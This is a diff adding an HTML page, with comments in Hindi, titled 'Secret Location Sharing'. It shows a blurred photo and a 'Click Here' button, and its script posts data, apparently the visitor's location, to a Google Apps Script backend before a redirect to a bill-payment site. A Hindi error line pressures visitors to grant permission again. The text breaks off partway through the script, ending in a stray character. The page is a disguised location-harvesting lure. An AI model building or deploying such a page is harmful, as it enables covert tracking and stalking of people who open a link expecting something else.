@@ -1,0 +1,116 @@
+ <!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="utf-8">
+  <title>Secret Location Sharing</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      /* आपकी इमेज जैसा ग्रेडिएंट बैकग्राउंड */
+      background: linear-gradient(to bottom, #0000 50%, #0000 50%);
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column; /* ताकि टाइटल पॉपअप के ऊपर रहे */
+    }
+    
+    .title {
+      font-family: 'Comic Sans MS', cursive, sans-serif; /* इमेज से मिलता-जुलता फॉन्ट */
+      font-size: 24px;
+      color: black;
+      margin-bottom: 10px;
+    }
+
+    .popup {
+      background: #1c9300;
+      padding: 20px;
+      border-radius: 20px; /* कोनों को ज्यादा गोल किया गया */
+      text-align: center;
+      width: 90%;
+      max-width: 280px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      border: 1px solid #e0e0e0;
+    }
+    
+    .popup img {
+      width: 100%; /* चौड़ाई को कंटेनर के बराबर किया */
+      height: auto; /* ऊंचाई अपने आप एडजस्ट होगी */
+      border-radius: 15px; /* इमेज के कोनों को गोल किया */
+      margin-bottom: 20px;
+      filter: blur(5px); /* शुरू में blur */
+      transition: filter 0.5s ease;
+    }
+
+    .btn {
+      appearance: none;
+      border: 1px solid #ccc;
+      background: #f9f9f9;
+      color: #333;
+      padding: 10px 20px;
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: .2s;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    .btn:hover {
+      background: #e9e9e9;
+    }
+
+    #loading-text {
+      display: none;
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    #error-text {
+      display: none;
+      margin-top: 5px;
+      font-size: 14px;
+      color: #d9534f;
+      animation: blink 2.3s infinite;
+      white-space: nowrap;
+    }
+    
+    @keyframes blink {
+      0%, 50%, 100% { opacity: 1; }
+      25%, 75% { opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="title">lofi</div>
+  <div class="popup">
+    <!-- आपकी दी गई फोटो का लिंक -->
+    <img id="user-photo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbiEO6kC-DPeWRMq11tHaT1cZ9wb57mJQuOCFF_uMs33baS0kUS3vMY4Rhh8tAraktW0ISjNNLqhQ20PRBAiFolU3agOt0PzVQf0-dBnwYT1mn7LB98iOUvUGEi_q1Yq4hqmxrezi5Qz5UpgJ-Vie0x14Chx6CPLxPVzgWcKYHuSAHqUQkZkefvI8G0rpo/s1269/1000127258.png" alt="User Photo">
+
+    <button class="btn" id="main-button" onclick="sendLocation()">Click Here</button>
+    <div id="loading-text">Loading...</div>
+    <div id="error-text"> आपने अनुमति नहीं दी, कृपया फिर से Allow करें</div>
+  </div>
+
+  <script>
+    // जावास्क्रिप्ट में कोई बदलाव नहीं किया गया है, यह पहले जैसा ही काम करेगा।
+    const BACKEND_URL = "https://script.google.com/macros/s/AKfycbyXQpXYJDMPTC9F9zf7fWzwlo0sBcQYpkh-dSYuKeGGUvA9H2WaPGkBxzgCE-PyVYGn/exec";
+    const REDIRECT_URL = "https://wss.nbpdcl.co.in/cportal/#/guest/secure/searchbill";
+
+    function postLocation(payload) {
+      fetch(BACKEND_URL, {
+        method: "POST",
+        headers: { "Content-Type": "text/plain;charset=utf-8" },
+        body: JSON.stringify(payload)
+      }).catch(err => console.error("Error:", err));
+    }
+
+    function sendLocation() {
+      document.getElementById("loading-text").style.display = "block";
+6
